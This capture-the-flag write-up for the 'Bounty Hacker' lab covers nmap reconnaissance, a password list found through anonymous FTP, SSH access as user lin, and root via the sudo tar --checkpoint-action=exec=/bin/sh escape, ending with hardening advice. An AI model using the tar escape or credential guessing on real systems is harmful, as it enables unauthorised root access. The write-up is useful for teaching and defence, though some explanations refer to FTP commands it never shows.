# Bounty Hacker


## 1. Reconnaissance

### Nmap results (full output as run)
Command:
```bash
nmap -sC -sV -oN bounty_scan.txt 10.48.130.139
```

- **Explanation:**
  - `-sC` runs Nmap’s default scripts to quickly check common service behaviors (e.g., anonymous FTP).
  - `-sV` probes service versions for actionable detail (e.g., vsftpd 3.0.5, OpenSSH 8.2p1, Apache 2.4.41).
  - `-oN bounty_scan.txt` saves the output to a file for documentation and reproducibility.


- **Why this step was done / What it revealed:**
  - Confirmed three open ports: FTP (21), SSH (22), and HTTP (80).
  - Script results revealed **anonymous FTP login allowed**, which is a likely foothold.
  - The HTTP banner looked unremarkable; the canonical Bounty Hacker path focuses on FTP and SSH.

- **Explanation:**
  - `ls -la` lists all entries with details (including owner, perms, size, timestamps).
  - The server hints “Consider using PASV” but directory listing still succeeded via active mode (PORT). The key takeaway is the presence of `locks.txt` and `task.txt`.

- **Explanation:**
  - `less` views the files without downloading, useful for quick inspection.
  - `locks.txt` is clearly a password wordlist.
  - `task.txt` ends with `-lin`, revealing the username `lin`.

### Web enumeration
- No web enumeration commands were performed. HTTP was noted but not used in this attack path.

### Directory brute-forcing / other tools
- No gobuster/ffuf/nikto were run in this chain. Enumeration focused on FTP and SSH exclusively.

---

## 2. Initial Access

### Attack vector
- Combine the discovered **username** (`lin` from `task.txt`) with the **password wordlist** (`locks.txt`) to authenticate to **SSH**.

### Vulnerability explanation
- Password reuse / weak credential policy: the presence of a password list on an anonymously accessible FTP server strongly suggests those passwords are valid somewhere (SSH).

### Commands used
- The session prompt indicates successful login as `lin`:
  ```
  lin@ip-10-48-130-139:~/Desktop$
  ```
- While the exact SSH command used was not captured in the notes, the presence of the `lin@...` shell prompt confirms an interactive shell as user `lin` on the target host.

### Steps that led to foothold
- Enumerated FTP to retrieve credentials context.
- Authenticated to SSH as `lin` using a password from `locks.txt`.

---

## 3. Post-Exploitation

### Shell stabilisation
- Not required; SSH provides a stable interactive TTY.

### User enumeration
- Listed contents of the Desktop directory, locating the user flag:
  ```bash
  lin@ip-10-48-130-139:~/Desktop$ ls -la
  total 12
  drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
  drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
  -rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt
  ```
  - **Explanation:** `ls -la` reveals detailed info; confirms `user.txt` is in `~/Desktop`.

- Attempt to read user flag (incorrect path):
  ```bash
  lin@ip-10-48-130-139:~/Desktop$ cat /home/lin/user.txt
  cat: /home/lin/user.txt: No such file or directory
  ```
  - **Explanation:** This was a benign mistake. The file is in `~/Desktop/user.txt`, not directly in `/home/lin/`. Highlighting the correction helps readers avoid the same path error.

### System analysis
- Checked sudo privileges:
  ```bash
  lin@ip-10-48-130-139:~/Desktop$ sudo -l
  [sudo] password for lin: 
  Matching Defaults entries for lin on ip-10-48-130-139:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User lin may run the following commands on ip-10-48-130-139:
      (root) /bin/tar
  ```
- **Explanation:**
  - `sudo -l` enumerates commands the current user can run with elevated privileges.
  - The critical finding: `lin` may run `/bin/tar` as **root**. This exposes a known privesc via `tar`’s checkpoint actions.

---

## 4. Privilege Escalation

### Exact path used
Exploit `tar`’s `--checkpoint` and `--checkpoint-action` to execute `/bin/sh` as root via sudo.

Command (as run):
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Immediate result:
```
tar: Removing leading `/' from member names
#
```
- The `#` prompt indicates a **root shell**.

### Why the vulnerability existed
- `sudo` configuration allowed the low-privileged user `lin` to run `/bin/tar` as root.
- GNU `tar` supports `--checkpoint=<N>` to invoke actions periodically during archiving and `--checkpoint-action=<action>` to run an arbitrary action. When run under `sudo`, those actions execute with root privileges.

### Detailed explanation of the exploit command
- `sudo` runs the subsequent command with elevated privileges as allowed by `sudoers`.
- `tar -cf /dev/null /dev/null`:
  - `-c` creates a new tar archive.
  - `-f /dev/null` writes the archive to `/dev/null` (discarded), avoiding filesystem changes.
  - The second `/dev/null` serves as a dummy “file” to include so the operation proceeds.
- `--checkpoint=1`:
  - Instructs `tar` to trigger a checkpoint after processing 1 record/file, ensuring the action fires quickly.
- `--checkpoint-action=exec=/bin/sh`:
  - On each checkpoint, execute `/bin/sh`. Because `tar` is running under `sudo`, this shell spawns with root privileges, dropping you into a root shell (`#`).

- **Usage example patterns (for documentation clarity):**
  - Spawn root shell:
    ```bash
    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    ```
  - Run a specific root command via tar (e.g., create a SUID shell — concept only, not used here):
    ```bash
    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='id'
    ```
    This would print the effective user context as root. The box used the shell-spawn approach.

---

## 5. Flags / Proof

### user.txt
- **Path:** `~/Desktop/user.txt`
- **Command used (correct form):**
  ```bash
  cat ~/Desktop/user.txt
  ```
  - Note: The attempted `cat /home/lin/user.txt` produced “No such file or directory” because the correct location was under `Desktop`.

### root.txt
- **Path:** `/root/root.txt`
- **Command used after privesc:**
  ```bash
  cat /root/root.txt
  ```
  - Read from within the root shell (`#` prompt) obtained via the `tar` exploit.

---

## 6. Final notes

### Hardening suggestions
- **Disable anonymous FTP** to prevent leakage of sensitive files like wordlists and notes.
- **Remove credential artifacts** (`locks.txt`) from accessible locations; treat internal lists as secrets.
- **Enforce strong, unique passwords** and avoid theme-based wordlists or predictable schemes.
- **Restrict sudoers entries**:
  - Avoid granting broad utilities like `/bin/tar` as root to unprivileged users.
  - If necessary, constrain with argument whitelisting or use wrappers to prevent dangerous options.
- **Audit GNU tar usage** in privileged contexts; be aware of `--checkpoint-action` exploitation vectors.
